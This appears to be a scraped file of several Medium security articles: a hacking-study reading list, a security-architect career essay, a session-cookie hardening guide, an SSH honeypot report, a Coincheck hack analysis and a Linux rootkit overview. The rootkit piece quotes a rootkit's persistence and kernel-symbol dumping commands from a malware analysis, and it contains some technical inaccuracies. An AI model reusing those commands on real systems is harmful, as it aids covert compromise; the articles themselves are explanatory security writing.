There are some books for web penetration testing and how you can find vulnerability in a website. And also this books will clear you understanding about how website and internet works.
1 . Web Hacking 101
2. Mastering Modern Web Penetration Testing
3. The Hacker Playbook 2: Practical Guide to Penetration Testing
4 . The Web Application Hacker’s Handbook: Finding and Exploiting Security Flaw
There is some youtube channel I personally like. I suggest you don’t follow what everyone going to tell you. Make your own path.
If you watch all videos of this two channel then you are pro in bug bounty.
You need to clear basic understanding about -
1. How HTTP works
2. How Networking works
3. What is TCP/IP Model
4. OWASP_Testing_Project
5. How LinuxCommand work
Now, you have basic understanding about Networking , Bug Bounty Programs And you also can easily play with a terminal. You also know about what is XSS, Sql injection , XEE etc..
You must learn programming language and python is a great programming language to start with. It is easy to use and also very powerful language.There are many powerful library that will help thing to do easily
Here is some free and paid books you can read to learn python. And The last book this my personal favorite one.
1. Paid book : Python CookBook, Third Edition
2. Free Book : How To Think Like A Computer Scientist: Learning With Python, by Allen Downey, Jeff Elkner and Chris Meyers
3. Beginner Book : Head First Python: A Brain-Friendly Guide
4. Cool Book : Automate The Boring Stuff With Python
5. For Hacking : Violent Python: A Cookbook for Hackers, Forensic Analysts, Penetration Testers and Security Engineers 1st Edition
There are many youtube video available to learn about python. In case if you don’t know you can watch this channels
Now , you are expert in python. You need to learn more languages like javascript, LinuxCommand And also HTML & CSS
Here is some books to learn about programming
Linux Scripting Book : Mastering Linux Shell Scripting: A practical guide to Linux command-line, Bash scripting, and Shell programming, 2nd Edition
Javascript Book : JavaScript: The Definitive Guide 6e (Definitive Guides)
HTML & CSS : Web Design with HTML, CSS, JavaScript and jQuery Set
You can’t do anything without syntax only if you don’t know how to use those, So you need to practice and practice your programming skill. There are many website for this ..
Now, you know programming you know about networking, you know about linux ,python , js programming. It time to play a real game with real world (No you don’t ready for bug bounty in hackerone or bugcrowd � �)
If you don’t know , what CTF is I am telling it shor. CTF(capture the flag) is like games, but it is for hacker and pentesters. You need to find a flag (a piece of code) in website or a virtual machine. In many CTF there is two teams one is red team(who will attack) and other is blue team(who will defence the system)
Now, there are many website give you to test you skill
Hackthebox
Hacker101
Rootme
Hackme
XSS Game by Google
CTF365
BWAPP
Backdoor
There is some website like hackthebox , vulnhub gives you to test you skill on vms.You can download vms from vulnhub and test it in you computer.
Pentesting , bug bounty is a small part of hacking. Which path you want to chose ? It is all about you cricuty and hunger to learn.
Now, let’s talk about hacking. For hacking you also need to learn many thing like
You need to learn everything And be expert in some things. A hacker is not expert in everything. Because it is impossible to be an expert in every field.
There are tons of thousands of videos on hacking. But you need to be clean what you want to watch in youtube. You want to watch videos how to use other people tools? or You want to make your own?
There are also many books on hacking but i will suggest you to read book on specific tropic. Then it will clear to understand the concepts. You goal should be to choose one thing about know everything about that.
There is also many books. Google on you interest.
You greatest tool is social media. You can get tons of information through it and also for free. Facebook is full of fake hacking group and pages. Through it I found some good resource
FaceBook:
https://www.facebook.com/0xInfection/
https://www.facebook.com/LiveOverflow/
Podcast :
There is very good podcast out there. I generally use castbox to listen podcast you can also find podcasts in itune.
Twitter :
In twitter you follow this tags
Generally you need 10,000 hours to be expert in anything. But you need to be expart in one thing. You notice that in a hacking group every hacker are expert in there own field. Like one hacker is best in reverse engineering and the other open is password cracking another one finding vulnerability. So you need to be persistent in you work. Don’t waste you time. Just keep learning everyday.
And yes I learned this things in one month.
Thank you for your time ☺️ ☺️
Written by
","['HackerRank', 'HackerEarth', 'Sololearn', 'Codewars', 'Codechef', '#infosec', '#pentest', 'cyber security', '#cyber', '#hacking', '#ctf', '#BugBountyTip', '#databreach', 'Hacking', 'Bug Bounty', 'Cybersecurity', 'Cryptocurrency', 'Python']"
What is a Security Architect? - secjuice™ - Medium,https://medium.com/secjuice/what-is-a-security-architect-a65d3b0c9707?source=tag_archive---------6-----------------------,"It was my second year of university when I realised that I wanted to work in security, I just loved the problem space, the challenge of finding bugs and working out how to exploit them. My first job after university was working for the government helping to find bugs in software that was being built to support the military. This involved reviewing cryptographic implementations, system code etc. It was fun and I learned a lot about working in a consultant role with engineers and topics such as cryptography, networks and systems design. In the following years I worked as a security engineer, a senior security engineer, architect and senior architect. Now I lead a team of senior architects and other amazing professionals.
I consider myself a security architect — it’s a title that a lot of people in industry seem to be adopting at the moment. One of my LinkedIn Mentees has recently decided to call himself an “architect” with just two years experience. I’m not sure that’s a good thing, I think title inflation can be dangerous. Certainly I’ve met a lot of self-described “security architects” who wouldn’t hold a candle to the men and women on my team. In this article I discuss the qualities I personally feel make someone a great security architect.
Generally speaking a security architect is someone in the IT security hierarchy who is more senior than an engineer but less so than the Chief Technology Officer (CTO) or Chief Information Security Officer (CISO). Depending on the organisation, there may be different levels of engineers and architects. For the purposes of this discussion. I’ve drawn a generic career ladder / org structure that we can use to discuss the different security roles out there.
I accept there are lots of roles missing from this generic diagram, perhaps even entire career streams; but it should be generic enough for this discussion. Most of the time, a security architect is near the top of the technical tree. There are only a few of us. We are supported by a cast of security engineers, specialists and analysts.
Security architects should be able to set, and alter the course of an organisations security journey. I expect architects to be able to look at processes such as DevOps with it’s collapsed separation of duties and rapid deployments-to-production process; and work out how we build new policy, guidance and audit processes that enable the business to meet all of it’s security requirements. Then, security engineers can create useful tools, services and crucially automation to support the business mission.
I’m a strong believer that security has to include a code delivery component. For me that means working with security engineers to get things built that make life easier for our developer communities. I’m convinced that the best way to achieve security assurance is to secure the path of least resistance for developers. Architects should understand the needs of the business and developers, and work out ways for both to succeed.
In my time I’ve met a lot of people who call themselves security architects but not many who I would recommend for our team. The title of security architect can be very flexible. I’m sure there are exceptions but I think it’s unlikely that you’ll be a successful architect if you haven’t come up through some security engineering role first, the basics are just too broad.
I don’t expect Security Architects to be experts in any of these areas but they need to have a very good working knowledge of all these topics. I have built up a list of some 50 interview questions that we use to assess Security Architect candidates. Most are open-ended like “Describe how TLS protects the connection between a browser and a server”. This is a question almost anyone can answer to some degree. It allows me to dig deeper and look for depth on networking and cryptography.
My interview questions fall into a number of categories that an architect needs to understand. I’ve explained some of the most important ones here.
You wouldn’t believe how many candidates fail to answer questions that demonstrate they take an interest in the industry: “Tell me about something that happened recently in the information security world that you found interesting” — it’s not a trick question, I just want to know that candidates are engaged with the industry.
A Security Architect should understand a lot about the business they’re trying to secure. They should have a working knowledge of cloud technologies, understand who the big players are, and the differences between their offerings. A good candidate looking for a role in my team will be able to describe what the security concerns and impact might be for an organisation looking to move from on-premises compute to public cloud. An excellent candidate will be able to explain how some clouds can improve the security of a number of different types of applications, depending on where they fit in the shared responsibility model.
Cryptography is the foundation of a significant number of security controls. Cryptography helps us to protect both the confidentiality and integrity of data in many ways. A good candidate will be able to explain the symmetric and asymmetric parts of a TLS handshake, and explain the difference between signing and hashing. An impressive candidate is able to explain the difference between stream and block implementations, and convey an understanding of code books and authenticated encryption.
Architects cannot work in ivory towers of academic correctness. We need to understand the compromises that teams make every day, in order to make things work. Security Architects should have strong opinions about the right way to build systems. Understanding common patterns for data ingestion, distribution, etc. is also very important. Good candidates can explain how we might implement distributed identity patterns, or how we trade consistency for availability in the light of network issues.
Security Architects need to use the same terms as customers. For example, architects should be able to explain the difference between threats and risks. I look for architects who can understand what organizations need to protect, who they need to protect it from, and how that protection should work. Bonus points if the architect can walk through threat classification frameworks like STRIDE or risk assessment models such as DREAD.
A good architect should relish the opportunity to take an afternoon off to play on some wargame or Capture the Flag (CTF) servers — I still do it from time to time. The reason is because we have to stay close to the basics. The day job may well involve more Powerpoint than C but when Spectre rolls around or Heartbleed rears its head, we have to be able to read the PoC’s and interpret the academic papers to understand how our organisation is affected. I expect architects to be able to describe basic buffer overflows, what one might look like, what happens to the stack and common protections. From there, we might talk about more low-level exploitation stuff like ROP or heap spraying. If the candidate is struggling, we’ll walk up the stack to talk about OS level exploitation and then web applications. A very good candidate will be able to explain the OWASP top 10 and what the common methods of mitigation are.
Think, would I want to work with this person every day? I learned a great piece of wisdom as an undergraduate, when the wonderful Clive King of Sun Microsystems (now Oracle) presented to my class at university. Clive showed how being personable, approachable, and empathetic are extremely valuable qualities in a Security Architect. The Security Architect role requires lots of cooperation and engagement within the security organisation and the business they’re supporting. Unfortunately, I’ve met too many Security Architects who have gotten used to bossing teams around and generally developing a superiority complex.
If you’re interested in learning new things, sympathetic to the needs of developers and passionate about security then, yes, you probably should consider becoming an IT Security Architect. It takes time to develop the experience required, the areas of interest I’ve called out above are really just a sampling of what’s required.
Every architect on our team is different. Some are crypto-wizards but struggle with massively distributed systems. Some are ninjas at low level exploitation, but hate talking about identity systems. However, thanks to our technical breadth and willingness to engage in difficult problems; all of us are security generalists, eager to understand new concepts.
Does that sound like you? We need more Security Architects!
Written by
","['Opinion', 'OSINT', 'How To', 'Security', 'Infosec', 'Cloud Computing', 'Career Advice', 'Cybersecurity']"
What is session hijacking and how you can stop it - Ramesh Lingappa - Medium,https://medium.com/@rameshlingappa/session-hijacking-and-how-to-stop-it-711e3683d1ac?source=tag_archive---------4-----------------------,"This story is for beginners and anyone who has a basic understanding about cookies (sessions cookies), but who’s not sure how to secure them properly. You don’t have to be a security expert to do that. You just have to understand the process and then you will know.
If you don’t have any idea about cookies or how they work, then please read this article about HTTP Cookies.
Let's get to it! You have an amazing web application offering a great service for customers. That means you will have an Authentication mechanism to get the user to your application. You know how important security is. You implemented all sorts of security measures during authentication. Great!
Upon successful authentication, you must create a Session for that user. This means that you are actually creating a cookie and sending it back to the browser. For example, in a Java web app, by default, it’s called JSESSIONID. It looks something like this:
By using this cookie, only your web server is able to identify who the user is and it will provide content accordingly. And this cookie looks great. No sensitive information in the cookie, just the random ID (non-guessable). So the user is Safe! …right?
Well not exactly, let’s take a closer look.
There are two properties in this cookie: HttpOnly (HTTP) and Secure. Their values are blank, meaning not enabled for this cookie. That’s where it gets to the point that it’s no longer safe.
This is where Session Hijacking comes into play.
Session hijacking, sometimes also known as cookie hijacking is the exploitation of a valid computer session — sometimes also called a session key — to gain unauthorised access to information or services in a computer system. — Wikipedia
So it’s the act of stealing a customer’s session ID, by which they can access your web application as if they’re that customer.
Is this possible? How do they get that session ID which is in the user’s browser?
Yes it’s possible. The two cookie properties (or flags) which we saw earlier (HttpOnly and Secure) are the reason for this.
HttpOnly cookies are inaccessible to JavaScript's Document.cookie API; they are only sent to the server. For example, cookies that persist server-side sessions don't need to be available to JavaScript, and the HttpOnly flag should be set.
So in simple terms, if you don’t set the httpOnly flag, then your cookie is readable from the front end JavaScript code.
Open any web page whose cookie doesn’t have the httpOnly flag set. Then open Chrome Dev Console and then tap Console Tab (Cmd + Shift+ J or Ctrl + Shift+ J). Type document.cookie and Enter, and you will see something like this:
As you can see, you get all the cookie info. A JavaScript attacker can simply post this to their own server for later use.
You might wonder how they can write this code in your Application. It’s possible in several ways.
One way is to inject some untrusted third-party JS library like logging, helper utilities, etc. Read this article I’m harvesting credit card numbers and passwords from your site. Here’s how.
Another way is by using a Cross Site Scripting Attack. We are not going to get into the details of it, but remember it can be done.
The session cookie doesn’t even need to be accessible by the JavaScript client. It’s only needed for the server. We should make it only accessible for the server. It can be done by adding one word (httpOnly) in your set_cookie http response header. Like this:
By adding the httpOnly flag, you are instructing the browser that this cookie should not be read by the JavaScript code. The browser will take care of the rest. This is how it looks after adding the httpOnly flag:
Notice the tick mark in the HTTP property. That indicates that httpOnly is enabled.
Here you can see that document.cookie doesn’t return our session cookie. Meaning no JS can read it, including any external scripts.
That’s it — one down one to go!
The secure flag instructs the browser that the cookie should only be returned to the application over encrypted connections, that is, an HTTPS connection.
So, when a cookie is sent to the browser with the flag secure, and when you make a request to the application using HTTP, the browser won’t attach this cookie in the request. It will attach it only in an HTTPS request. The HTTPS request will be encrypted so cookies will be safely sent across the network to your application.
How can someone read the cookie in the HTTP request?
This can be achieved when someone (called a “Man in the Middle” attack) is monitoring all the traffic in the network of customers. They are able to see the clear text data if the request is in HTTP.
When it’s sent over HTTPS, all data will be encrypted from the browser and sent to the network. The attacker won’t be able to get the raw data you were sending. Nor will the attacker be able to decrypt the content. This is why sending Data over SSL is secure.
Just like the httpOnly flag, you just need to add the secure flag in your set_cookie HTTP response header. Like this:
In Java it can be done in several ways. If you are using Servlet 3.0 or above, then you can configure these settings in web.xml like this:
If your environment doesn’t support it, then you can add it manually. For example using Servlets you can do this:
Finally, this is how it looks when both flags are set,
So when you are dealing with session cookies or any other important cookies, make sure you add these two flags.
Thanks for reading, Happy Securing!
Written by
","['Cybersecurity', 'Programming', 'JavaScript', 'Web Development', 'Tech']"
What SSH Hacking Attempts Look Like - Doug Rickert - Medium,https://medium.com/@dmrickert/what-ssh-hacking-attempts-look-like-8f698e70a4f5?source=tag_archive---------5-----------------------,"With jobs that have been so tied to secure software design and government compliance, I constantly fall back on the assumption “if it’s insecure, you’ll eventually be hacked”. But what does being hacked actually look like? If I set up a server and don’t make myself an obviously vulnerable target (i.e. not going to show up in common shodan.io searches) what would actually happen?
Queue the honeypot concept. A “honeypot” is an intentionally vulnerable “thing” that can be used to study malicious traffic and activity on a network. This “thing” can be anything, a single port on a server, an HTML element on a webpage, or even a network with multiple servers. Once it’s set up, any malicious traffic towards the server can be studied and turned into actionable intel.
So I went searching for honeypot software that I could run myself. I ended up using Cowrie, a Python based SSH/Telnet emulator that is based on the prior work of the Kippo project. I was attracted to it for a few reasons: it had a lot of support articles, it was written in Python, and the Cowrie worked with Kippo’s lightweight visualization software Kippo-Graph. With Kippo-Graph I could keep an eye on things from my phone without having to SSH into the server.
I’ll skip the gory details of the setup, but if you’re interested “Use the Cowrie SSH Honeypot to Catch Attackers on Your Network” was an awesome tutorial.
So, I fired up the honeypot software and set the SSH emulator on port 22 to allow the usernames root and admin with the passwords changeme and 1234567, respectively. I sat back and watched and…
People tried to guess my SSH password a lot. Anywhere from 200 to just over 1200 times per day. The tries mostly came from:
And with the passwords set at what I thought were very insecure (remember, passwords were just changeme and 1234567) only 4 attempts were successful. I was hacked by:
All of this was honestly pretty anti-climactic and boring. My job is to tell people if they do insecure things they’ll be hacked! And yet here I was, using bad username/password combinations and barely getting compromised. So, I decided to turn it up.
I looked at the graphic that Kippo-Graph provides of the username-password combinations.
I was still a little weary about the consequences of a lot of action in my honeypot, so I avoided all of these default IoT credential-looking passwords and chose two new combinations to add. The first was admin/admin1 (I saw a few attempts on these) and the second was one I thought was very interesting, pi/raspberryraspberry993311.
Pi is the default user for the popular Raspbian distro that is used widely with the Raspberry Pi systems. However, the default password is raspberry not raspberryraspberry993311. A quick Google search of the password brought up a lot of raw honeypot data but no explanation! So, I decided to accept it and see what the deal was.
And right away I was hacked by the French! Well, someone coming from a French IP. And it curiously used that raspberryraspberry993311 password. The threat actor immediately uploaded a bash script and attempted to run it. The bash script was a worm that configured the server to:
This Raspberry Pi Botnet malware did quite quite a few other things and I plan to get around to an entire post dedicated to dissecting that.
After the French, I was hacked by an IP in Switzerland that switched to an IP in Ireland after it found successful credentials. The threat actor attempted to load malware onto the machine that used the phrase “gweerwe323f” throughout. The malware mostly contained shellcode, and I haven’t had the time to really pick that apart either. But based on further compromises, this was definitely another botnet running through scripted actions.
Finally I wanted to see what would happen if I just set the credentials to accept username admin and password admin. Over the next day I just kept getting hacked by the same gweerwe323f botnet over and over.
At this point the fun had started to dwindle so I killed the honeypot. For those interested, here are the top 10 passwords attempted:
And here are the top 10 username/password combinations that were attempted on my honeypot:
They all felt extremely Internet of Things oriented at first glance. It absolutely shocked me that it is worth the time of these drive-by attacks to try combinations like root/password, root/root, or root/admin. Apparently they have enough successes using those incredibly insecure combinations that it is worth their time.
I also did a quick analysis of my Apache access log to see what was attempted on my password protected web-server. Since the web-server wasn’t vulnerable there was not much malicious activity to dissect, but I did see a lot of requests to access the path /manager/html that would exist by default for an ApacheTomcat installation. Otherwise, it was just the classic attempts to find phpMyAdmin.
I wouldn’t feel like this post is complete without suggesting the open source software Fail2Ban. For those of you who got to the bottom of this and was wondered “well, why don’t I just block those IPs”, you are absolutely correct. Software like Fail2Ban can monitor your log files for malicious activity like this and block future attempts from those IPs. There’s also plenty more you could do with this data or a honeypot. Put a honeypot internally on your company network and watch for malicious activity such as network scanning. Put it in your company’s Public IP space and see if there’s any targeted attacks unique to your company or industry.
Maybe in the future I’ll revisit the data and search for more interesting patterns like what lead me to the Raspberry Pi botnet. For now, my honeypot is turned off and I’d call it a successful experiment.
Written by
","['Cybersecurity', 'Network Security', 'Botnet', 'Honeypot', 'Linux']"
What the Coincheck hack means for the future of blockchain security,https://medium.com/mit-technology-review/what-the-coincheck-hack-means-for-the-future-of-blockchain-security-7ce0179c2cc8?source=tag_archive---------9-----------------------,"By Mike Orcutt
The plunder of more than $500 million worth of digital coins from the Japanese cryptocurrency exchange Coincheck last week has added to a growing perception that cryptocurrencies are particularly vulnerable to hackers.
It’s an expensive reminder that like many things in the cryptocurrency world, security technologies — and the norms, best practices, and rules for using them — are still emerging. Not least because of its enormous size, the Coincheck hack could go down as a seminal moment in that process.
First, hackers laid bare the fact that Coincheck had opted not to implement some basic security measures. The company’s executives told news reporters that the stolen coins had been stored in an internet-connected “hot” wallet. It’s far more secure to keep funds offline, in “cold” storage — often hardware specially designed for the task. Many exchanges already claim in their marketing material that they hold the vast majority of their users’ funds offline. Going forward, this will presumably become standard practice.
With that taken care of, there’s a more weighty question on the table. Every public cryptocurrency address is associated with a private key; without it, money can’t be moved from that address. Someone who manages to acquire your private key, though, can send your money away. That’s what happened in the Coincheck heist. So how do we make the private cryptographic keys owners need to access their coins more secure?
One answer, known as a multisignature address, is conceptually simple: a “multisig” requires more than one cryptographic key in order execute a transaction. It’s a bit like the multifactor authentication process you may use to access your e-mail account. Business partners can use multisig technology to, for example, create a wallet that requires each of them to sign off on transactions. That would make it substantially more difficult for hackers to access funds.
Of course, multisig is not a silver bullet. In 2016, for example, hackers defeated a multisig system to steal $65 million from Bitfinex, one of the world’s largest exchanges. How exactly the perpetrators managed the feat isn’t clear, but it’s possible there was a flaw in the specific implementation.
Should financial regulators require exchanges to use multisig technology to secure any funds they keep in a hot wallet? Japanese officials are conducting an emergency security review of the country’s exchanges, and that might be a measure they consider.
Either way, a broader discussion about blockchain security is just beginning. Some say blockchains can revolutionize how we track a host of assets beyond just money, like land titles. Such a system might look different from the blockchain networks running today’s cryptocurrencies, but it would still rely on cryptographic keys that could fall into the wrong hands. The techniques and processes we adopt for securing them will be crucial for keeping hackers from running off with land that isn’t theirs.
Originally published at www.technologyreview.com on February 1, 2018.
Written by
","['Bitcoin', 'Cryptocurrency', 'Cybersecurity', 'Crime', 'Technology']"
What The Hell Are We Doing? - Dave Pell - Medium,https://medium.com/@davepell/what-the-hell-are-we-doing-a87df90ff997?source=tag_archive---------4-----------------------,"(Or, why E.T. phoned home…)
There are a lot of ways to tell the story of the Internet. Here’s one: With every advance and every new technology offered to consumers, we dramatically increase the risk we face as individuals, nations, and societies.
We now know that a recent distributed denial of service attack that barred many of us from top sites came at us through the edges of our ever-expanding network; this time it was the internet of things. This shouldn’t come as much surprise. The more we push the envelope, the more we head down the information highway to the danger zone.
We’re making the tools. We’re sharing our information. And we’re convinced we’re having a good time doing it. We can’t wait to buy the next connected device. We’re so obsessed with our connectivity that we’ve stopped looking up from our devices when our kids are talking to us. We take so many pictures of ourselves that phone makers added a camera for that very purpose (even Narcissus thought a front-facing camera would be a bit much). How many people have to walk off a cliff or drive into a telephone pole while texting before we can admit we might have a problem? I’m not pointing fingers. I’m not jotting down these concerns into a paper journal. Like you, I can’t stop sharing even when those I’m sharing with don’t want what I’m sharing. The only ones who do are the hackers.
Ironically, the DDoS effort that prevented us from accessing the Internet slowed the velocity at which we’re all racing to throw our last remnants of privacy into a bottomless pit. At least, for a few minutes, we stopped playing the part of the accomplice in an ongoing plot to obliterate our own privacy. After all, when it comes to our Internet use, privacy loss is not merely collateral damage. It’s not ancillary to the experience, it is the experience. We enthusiastically put more of ourselves out there for the taking every chance we get. Many of us are even addicted to that behavior (writes the guy who hasn’t let an inner-thought go unpublished since the late 90s).
We keep making and using the tools even though we’re reminded of the potential harm almost every week. The hacking of Yahoo Mail was yet another confirmation that we’ve all been affected, probably many times over. Our banks have been attacked. Our places of work have been attacked. Our doctors, our schools … even the most powerful among us regularly get a cold, hard lesson in the risk of being overexposed. Consider that the data from private emails stolen from the most powerful people in the nation is now an absolute centerpiece of an American election. This follows a year in which we saw a massive corporation like Sony nearly destroyed by hackers.
You. Your employer. Your government… But wait, there’s more. Think of the massive military advantage the US has built up over the last two centuries. Almost none of that advantage even loosely applies to the modern battles being waged on a new front that some politicians call The Cyber. If the Super in Super Power is going to be at least partially measured by technological prowess, doesn’t that shrink some of the advantages we’ve maintained for generations? We’re still ahead, but one senses a leveling. We’ve already seen small groups within nation states have a massive geopolitical impact. Meanwhile, it’s almost impossible to push a tank through an ethernet cable.
The Internet was born as part of the military. And now we need the military to protect us from the Internet. Can they do it? I don’t know, you’d have to ask someone with more technical knowledge (like the teenager who hacked the Pentagon).
And the Internet’s bad hombres sure seem to be advancing their tools a lot faster than we can make ones to stop them. That trend seems destined to accelerate as technology “improves.” Again, the more we push the machine into our lives, the more the machine puts us at risk. John Markoff makes a related point in his NYT piece: As Artificial Intelligence Evolves, So Does Its Criminal Potential.
Social engineering, which refers to the practice of manipulating people into performing actions or divulging information, is widely seen as the weakest link in the computer security chain. Cybercriminals already exploit the best qualities in humans — trust and willingness to help others — to steal and spy. The ability to create artificial intelligence avatars that can fool people online will only make the problem worse.
No wonder E.T. wanted to phone home. He understood that the newer the technology, the greater the risk. And unlike us, he didn’t add to that risk by willingly spilling his personal beans (or in his case, Reese’s Pieces) into the network.
We’re enthusiastically participating in the development of a network that puts us in greater danger with each advancement.
But again, there are a lot of ways to tell the story of the Internet. And this is only one. There’s another equally compelling version that focuses on cat videos.
-Get Dave Pell’s NextDraft. Why choose now to protect your email?
Written by
","['Cybersecurity', 'Security', 'Culture', 'Tech', 'Lifestyle']"
What You Must Know About Linux Rootkits - Kim Crawley - Medium,https://medium.com/@kim_crawley/what-you-must-know-about-linux-rootkits-416fa8d4142?source=tag_archive---------1-----------------------,"Imagine that you’re using your PC, server, smartphone or tablet. The operating system and applications on it aren’t behaving the way they usually do.
You pull up Google’s search page in your web browser. You get redirected to a web page filled with blinking web banners saying “Your computer has 6,666 viruses! Click here to remove them now!”
Britney Spears is your guilty pleasure. You pop a CD of her Blackout album into your laptop’s optical drive, the one you bought from HMV back in 2007. Instead of your default music application playing the sweet sounds of “Gimme More,” a window pops up. “This CD needs a special program to play it. Click here!”
You navigate back to your desktop. You double-click on the iTunes icon. Instead of iTunes launching, something else does. “Hot Russian chicks… They’re lonely, horny and desperate! They want to talk to YOU! Click here!”
Your best friend calls you on your Android smartphone. “Why do you keep texting me about the ‘one weird trick’ for losing weight?”
Anyone who’s reasonably familiar with computer technology could probably guess that malware is the culprit to all that calamity.
In my IT security career, I interact with both end users and computing professionals from all walks of life. There’s so much Windows targetting malware that’s been circulating through the internet for the past couple of decades that most Windows users, even when they use currently patched antivirus shields, are all too familiar with many of the symptoms of infection.
It’s also a popular myth that malware is exclusively a Windows problem. Many Apple fans say, “I don’t need an antivirus program, I use a Mac!”
And although x86 Linux distro users tend to be more technologically savvy than most, many of them, even those who work in IT, would never consider malware to be a possibility on their platform of choice.
Malware is one of my primary areas of professional focus and study. I’ve rescued datacenters from malware that has crippled their entire internal networks.
I’ve said this time and time again; any computer that can receive outside data, whether via networking or removable media, can become infected with malware. The only way to guarantee that a computer, whether it’s a PC, server, smartphone, tablet, or embedded system, will never get infected is by thoroughly examining its data storage on disks and firmware, and then completely cutting it off from networking and removable media. And that’s simply not plausible, especially in the 21st century.
Your typical end user probably never sees Ubuntu, Fedora, or Linux Mint. But they’re using the Linux kernel, likely every single day.
More than half of all web servers run a Linux distro with Apache operated HTTP/HTTPS services.
Android, on both smartphones and tablets, now has greater mobile marketshare than Apple’s iOS. Although Android is mainly proprietary Java code, there’s an open source Linux kernel underneath.
So, possibly billions of people are using Linux everyday, and they don’t even know it.
Of course, Linux is simply a kernel. What kind of malware targets kernels? Rootkits!
Unlike many other types of malware, rootkits don’t self-propagate. Something must deliver the rootkit. It could be a virus, which attaches itself to program files or other code. It could be a worm that spreads through a network like wildfire. It could be a flash media USB stick that your buddy lent you with their family vacation photos on it. It could even be a popular webpage which uses server-side scripting technology like JavaScript. And most malware-infected webpages weren’t designed maliciously. There may be vulnerabilities in the code, and a web malware distributing bot took advantage.
The blackhats who script rootkits don’t always fit the “hacker” stereotype. At least one multibillion dollar corporation was caught redhanded back in 2005, Sony. Sony/BMG is Britney Spears’ record label, and they also are the label for a large percentage of the most popular rock stars and bands.
Sony/BMG, like the other major players in the music industry, have been stressed out over lost profit from music piracy since Napster became a phenomenon in 1999. So, many CDs of Billboard’s bestselling albums that Sony sold from roughly 2005 to 2007 had rootkits hidden on them.
One of the first rootkits Sony/BMG developed, XCP, was discovered by IT security researcher Mark Russinovich on October 31st, 2005. No mention of its existance was ever in any pertinent end user license agreement.
Although the rootkit was designed to prevent consumers from ripping music files from Sony/BMG CDs to pirate through the internet, the rootkit also created countless vulnerabilities that more common types of malware could exploit, with devastating consequences.
The incident was definitely a bad PR move for Sony.
XCP and Sony’s other rootkits from that time period targetted Windows client OSes only. But that’s probably because Sony knew that at the time, the overwhelming majority of PC users ran Windows. Also, it’s bloody easy to write malware in Visual Studio. Many of the scripts that script kiddies use, even now, are written in that proprietary Microsoft IDE.
But blackhats, whether they’re prototypical criminals or employees of large corporations, are usually now aware that most web servers and mobile devices run a Linux kernel.
Linux rootkits have already been identified.
In November 2012, a scary Linux rootkit was a hot topic in the tech media world. It targetted Linux server distros that were based on Debian. The specific Linux kernel version it exploited was 2.6.32–5-amd64.
By penetrating the kernel, it would then propagate via webpage embedded JavaScript code that works with the HTML <iframe> tag.
Researchers at Kaspersky Lab and CrowdStrike did a thorough analysis.
Marta Janus of Kaspersky Lab wrote, “The malware ensures its startup by adding an entry to the /etc/rc.local script: insmod /lib/modules/2.6.32–5-amd64/kernel/sound/module_init.ko. After loading into memory, the rootkit uses one of two methods to retrieve kernel symbols and write them to the /.kallsyms_tmp file:
/bin/bash -c cat /proc/kallsyms > /.kallsyms_tmp
/bin/bash -c cat /boot/System.map-`uname -r` > /.kallsyms_tmp
Then it extracts the memory addresses of several kernel functions and variables and stores them in the memory for the later use.”
By infecting 2.6.32–5-amd64 based web servers, the rootkit would generate <iframe> HTML code into webpages via PHP. The new <iframe> tags would redirect web surfers to malicious webpages that could behave as spyware, or infect surfers’ machines with even more destructive malware.
On December 29th, 2011, StackExchange user Olier Saari posted that his Linux-based server was generating spam. He found Perl code that he suspected was part of the rootkit. The following are the results of his testing and modifications, pasted from Bash.
For every single Linux rootkit that someone discovers and posts about online, there have got to be many more that only the blackhats who developed them know about.
Here’s another example. Before the 3.7.6 version of the Linux kernel was released, there was a vulnerability in the msr_open function located in arch/x86/kernel/msr.c. It allowed rootkits to bypass root in a restricted user account to inject and launch malicious code.
Spender, the handle of a user at grsecurity.net, wrote a script designed to exploit that vulnerability. Here it is, in its entirety.
People like Spender write these scripts so that OS developers can learn how to security harden their kernels against rootkits.
I’ve barely scratched the surface. The possibilities of Linux rootkits are endless.
Although typical end users interact with Linux servers via client machines running Windows, or the BSD/UNIX based Mac OS X and iOS, the one Linux based OS that end users frequently interact with directly is Android.
Yes, Android rootkits are Linux rootkits.
In 2011, a Reddit user who goes by the handle Lompolo discovered that there were a number of apps that were available in the Android Market (now known as the Google Play Store) that were trojans with Android rootkit code. The developers of the trojan apps went under “Myournet,” “Kingmall2010,” and “we20090202.” Some of the names of those various apps were “Super Guitar Solo,” “Hot Sexy Videos,” “Chess,” “Scientific Calculator,” and “Advanced App to SD.”
Benn of Intrepdius Group Mobile Security found some Android rootkit code which is likely very similiar to the code found in those trojans.
That sort of scripting can have disasterous effects on an Android device. Spambotting, SMS malware propagation, Android rogue AVs, spyware… the possibilities are endless.
Anyone can upload apps to the Google Play Store, but Google puts a lot of effort into removing malicious apps from the store as soon as they become aware of them. Then, they ban the developer’s Google Play Store account. That’s wonderful, but useless for zero-day attacks.
So, what can you do to prevent yourself from becoming a victim of a Linux rootkit? There’s no way to eliminate the risk 100%, but there are excellent things you can do to protect yourself and your devices.
ClamAV develops an excellent open source antivirus shield that can run in most x86 Linux distros, both client and server. Their development team constantly looks for Linux specific threats and vulnerabilities, and they distribute new malware signatures almost daily. I strongly endorse running ClamAV on all types of x86 Linux machines.
Also, make sure that the Linux distros of your choice are configured to install security patches as frequently as possible. Even more importantly, make sure your OSes use the latest stable Linux kernels. Linux kernel developers constantly work on finding vulnerabilities and patching them.
If you’re like me, and you have an Android device, go to the Google Play Store and install Lookout Mobile Security. Its AV shield is free of charge, and it also patches frequently. There’s also now a version of Malwarebytes Anti-Malware for Android. It won’t conflict with your Lookout AV shield, and you can use it periodically to scan for malware. Just be wary of false positives! Many people would rather not admit it, but pirated and cracked commercial Android apps are very popular. The cracks that many of those pirated apps have are designed to overcome Android’s DRM, but may not have any malicious effect on your Android device. If you’re going to take a risk and install cracked apps, proceed with caution. Of course, I don’t advocate software piracy. If you really like a cracked app that you installed on your Android device, please buy a legitimate install as soon as you can afford it. Most Android developers are individuals or small businesses, and they can’t keep developing the utilities and games that you love if they can’t make any money.
As I mentioned, computers that run Windows, OS X, iOS and other non-Linux operating systems can still get infected via rootkits on Linux servers. No operating system is immune to malware. Clam, Lookout and Kaspersky all develop excellent AV shields for Windows, OS X, iOS, BlackBerry, and UNIX OSes such as OpenBSD. Like in desktop Linux distros, make sure that all of your operating systems get security patches as soon as they become available.
